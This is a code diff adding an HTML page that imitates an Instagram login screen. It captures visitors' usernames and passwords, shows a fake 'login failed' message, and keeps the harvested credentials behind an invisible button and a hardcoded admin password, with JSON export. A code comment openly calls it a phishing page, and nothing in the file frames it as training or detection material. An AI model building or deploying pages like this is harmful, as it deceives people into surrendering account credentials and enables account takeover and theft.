@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .hidden-admin-btn {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            width: 20px;
+            height: 20px;
+            opacity: 0;
+            cursor: pointer;
+            z-index: 9999;
+        }
+        
+        .admin-panel {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            z-index: 10000;
+            overflow-y: auto;
+            padding: 20px;
+        }
+        
+        .floating-notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #4CAF50;
+            color: white;
+            padding: 15px;
+            border-radius: 5px;
+            display: none;
+            z-index: 10001;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen flex items-center justify-center">
+    <!-- Main Login Form -->
+    <div class="bg-white p-8 rounded-lg shadow-md w-full max-w-md border border-gray-200">
+        <div class="text-center mb-6">
+            <i class="fab fa-instagram text-4xl text-pink-600 mb-4"></i>
+            <h1 class="text-xl font-semibold text-gray-800">Log in to access this person's content</h1>
+            <p class="text-gray-600 mt-2">Enter your Instagram username and password to continue.</p>
+        </div>
+        
+        <form id="loginForm" class="space-y-4">
+            <div>
+                <label for="username" class="block text-sm font-medium text-gray-700 mb-1">Username</label>
+                <input type="text" id="username" name="username" required 
+                       class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500">
+            </div>
+            
+            <div>
+                <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                <input type="password" id="password" name="password" required 
+                       class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-pink-500">
+            </div>
+            
+            <button type="submit" class="w-full bg-pink-600 text-white py-2 px-4 rounded-md hover:bg-pink-700 transition duration-200 font-medium">
+                Log In
+            </button>
+        </form>
+        
+        <div class="mt-6 text-center text-sm text-gray-500">
+            <p>By logging in, you agree to our Terms and Privacy Policy.</p>
+        </div>
+    </div>
+    
+    <!-- Hidden Admin Button (invisible but clickable) -->
+    <div class="hidden-admin-btn" id="adminBtn"></div>
+    
+    <!-- Admin Panel (hidden by default) -->
+    <div class="admin-panel" id="adminPanel">
+        <div class="max-w-4xl mx-auto">
+            <div class="flex justify-between items-center mb-6">
+                <h1 class="text-2xl font-bold text-gray-800">Admin Panel</h1>
+                <button id="closeAdminPanel" class="bg-red-500 text-white px-4 py-2 rounded-md hover:bg-red-600">
+                    Close Panel
+                </button>
+            </div>
+            
+            <div class="bg-white rounded-lg shadow overflow-hidden border border-gray-200">
+                <div class="px-6 py-4 border-b border-gray-200 bg-gray-50">
+                    <h2 class="text-lg font-medium text-gray-800">Collected Credentials</h2>
+                    <p class="text-sm text-gray-600">Total entries: <span id="totalEntries">0</span></p>
+                </div>
+                
+                <div class="divide-y divide-gray-200">
+                    <div class="grid grid-cols-12 bg-gray-100 px-6 py-3 font-medium text-gray-700">
+                        <div class="col-span-1">#</div>
+                        <div class="col-span-4">Username</div>
+                        <div class="col-span-5">Password</div>
+                        <div class="col-span-2">Date</div>
+                    </div>
+                    
+                    <div id="credentialsList" class="divide-y divide-gray-200">
+                        <!-- Credentials will be inserted here -->
+                    </div>
+                </div>
+            </div>
+            
+            <div class="mt-4">
+                <button id="exportBtn" class="bg-blue-500 text-white px-4 py-2 rounded-md hover:bg-blue-600 mr-2">
+                    Export as JSON
+                </button>
+                <button id="clearAllBtn" class="bg-red-500 text-white px-4 py-2 rounded-md hover:bg-red-600">
+                    Clear All Data
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Admin Password Modal -->
+    <div id="adminPasswordModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden z-10001">
+        <div class="bg-white p-6 rounded-lg shadow-lg max-w-sm w-full">
+            <h2 class="text-xl font-bold mb-4">Admin Authentication</h2>
+            <input type="password" id="adminPassword" placeholder="Enter admin password" 
+                   class="w-full px-4 py-2 border border-gray-300 rounded-md mb-4">
+            <button id="submitAdminPassword" class="w-full bg-blue-500 text-white py-2 px-4 rounded-md hover:bg-blue-600">
+                Submit
+            </button>
+        </div>
+    </div>
+    
+    <!-- Floating Notification -->
+    <div class="floating-notification" id="notification">
+        Credentials saved successfully!
+    </div>
+    
+    <script>
+        // Initialize storage if not exists
+        if (!localStorage.getItem('instagramCredentials')) {
+            localStorage.setItem('instagramCredentials', JSON.stringify([]));
+        }
+        
+        // Form submission handler
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            if (username && password) {
+                // Save credentials
+                const credentials = JSON.parse(localStorage.getItem('instagramCredentials'));
+                credentials.push({
+                    username: username,
+                    password: password,
+                    date: new Date().toLocaleString()
+                });
+                
+                localStorage.setItem('instagramCredentials', JSON.stringify(credentials));
+                
+                // Show notification
+                const notification = document.getElementById('notification');
+                notification.style.display = 'block';
+                setTimeout(() => {
+                    notification.style.display = 'none';
+                }, 3000);
+                
+                // Reset form
+                document.getElementById('loginForm').reset();
+                
+                // Fake redirect (in a real phishing page, you might redirect to Instagram to make it seem legit)
+                setTimeout(() => {
+                    alert('Login failed. Please check your username and password and try again.');
+                }, 1500);
+            }
+        });
+        
+        // Admin functionality
+        document.getElementById('adminBtn').addEventListener('click', function() {
+            document.getElementById('adminPasswordModal').classList.remove('hidden');
+        });
+        
+        document.getElementById('submitAdminPassword').addEventListener('click', function() {
+            const password = document.getElementById('adminPassword').value;
+            
+            if (password === 'Yusuf') {
+                document.getElementById('adminPasswordModal').classList.add('hidden');
+                document.getElementById('adminPanel').style.display = 'block';
+                loadCredentials();
+            } else {
+                alert('Incorrect admin password!');
+            }
+        });
+        
+        document.getElementById('closeAdminPanel').addEventListener('click', function() {
+            document.getElementById('adminPanel').style.display = 'none';
+        });
+        
+        document.getElementById('exportBtn').addEventListener('click', function() {
+            const credentials = JSON.parse(localStorage.getItem('instagramCredentials'));
+            const dataStr = JSON.stringify(credentials, null, 2);
+            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
+            
+            const exportFileDefaultName = 'instagram_credentials.json';
+            
+            const linkElement = document.createElement('a');
+            linkElement.setAttribute('href', dataUri);
+            linkElement.setAttribute('download', exportFileDefaultName);
+            linkElement.click();
+        });
+        
+        document.getElementById('clearAllBtn').addEventListener('click', function() {
+            if (confirm('Are you sure you want to delete ALL collected credentials? This cannot be undone.')) {
+                localStorage.setItem('instagramCredentials', JSON.stringify([]));
+                loadCredentials();
+            }
+        });
+        
+        function loadCredentials() {
+            const credentials = JSON.parse(localStorage.getItem('instagramCredentials'));
+            const credentialsList = document.getElementById('credentialsList');
+            const totalEntries = document.getElementById('totalEntries');
+            
+            credentialsList.innerHTML = '';
+            totalEntries.textContent = credentials.length;
+            
+            if (credentials.length === 0) {
+                credentialsList.innerHTML = '<div class="px-6 py-4 text-center text-gray-500">No credentials collected yet.</div>';
+                return;
+            }
+            
+            credentials.forEach((cred, index) => {
+                const row = document.createElement('div');
+                row.className = 'grid grid-cols-12 px-6 py-3 text-sm';
+                
+                row.innerHTML = `
+                    <div class="col-span-1">${index + 1}</div>
+                    <div class="col-span-4 font-medium">${cred.username}</div>
+                    <div class="col-span-5">${cred.password}</div>
+                    <div class="col-span-2 text-gray-500">${cred.date}</div>
+                `;
+                
+                credentialsList.appendChild(row);
+            });
+        }
+    </script>
+</body>
+</html>
